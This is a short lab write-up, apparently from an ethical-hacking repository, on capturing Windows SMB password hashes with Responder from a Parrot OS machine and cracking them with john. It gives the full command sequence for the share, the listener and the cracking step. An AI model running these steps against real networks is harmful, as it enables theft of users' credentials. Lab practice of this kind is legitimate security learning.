Retrieve password using 'Responder'

### Images and Instance Configurations

- **win11 c5large 65gb**
- **Parrot OS c5 65gb**

### Parrot OS / Kali
```bash
sudo apt-get update
sudo apt-get install samba
```
```bash
mkdir /home/parrot/sharefolder
```

#### Command to Share Folder via SMB

To share a folder on Parrot OS, execute the following command:

```bash
sudo net usershare add sharefolder /home/parrot/sharefolder "A secret folder shared via SMB" everyone:F guest_ok=y
```

Run Responder with the interface from "ip a":
```bash
sudo responder -I ens5
```

#### Access Shared Folder on Windows 11

1. On Windows 11, press `Win + R` to open the Run dialog.
2. Type `\\[Parrot_private_IP]` and press Enter.

> **Note:** When trying to enter the password, an error may occur, and the hash will appear on Parrot OS.

#### Responder Logs on Parrot OS

Responder logs are stored in the following directory:

```plaintext
/usr/share/responder/logs
```

To process the captured hashes, use `john`:

```bash
john SMB-xxxxxxxx- TAB
```
![image](https://github.com/pinhers/Ethical-Hacking/assets/145346889/fbc80557-4c7f-454d-a580-ee86b84835a4)

### Troubleshooting

If you need to troubleshoot issues related to SMB, use the following commands:

1. Check which processes are using port 445:
    ```bash
    sudo lsof -i :445
    ```

2. Stop the `smbd` service:
    ```bash
    sudo systemctl stop smbd
    ```
